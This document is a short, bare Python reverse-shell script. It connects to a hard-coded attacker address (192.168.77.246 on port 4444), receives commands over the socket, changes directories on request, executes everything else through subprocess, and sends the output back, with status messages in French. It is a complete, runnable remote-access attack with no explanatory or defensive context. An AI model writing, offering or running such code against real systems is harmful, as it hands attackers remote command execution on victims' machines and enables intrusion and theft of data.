import socket
import subprocess
import os

def connect_to_attacker(attacker_ip, port):
    s = socket.socket()
    try:
        s.connect((attacker_ip, port))
    except:
        return

    while True:
        try:
            cmd = s.recv(1024).decode()
            if cmd.lower() == "exit":
                break
            elif cmd.startswith("cd "):
                try:
                    os.chdir(cmd[3:].strip())
                    s.send(f"[+] Répertoire changé: {os.getcwd()}\n".encode())
                except Exception as e:
                    s.send(f"[!] Erreur : {str(e)}\n".encode())
            else:
                output = subprocess.getoutput(cmd)
                s.send((output + "\n").encode())
        except Exception as e:
            s.send(f"[!] Erreur : {str(e)}\n".encode())

    s.close()


connect_to_attacker("192.168.77.246", 4444)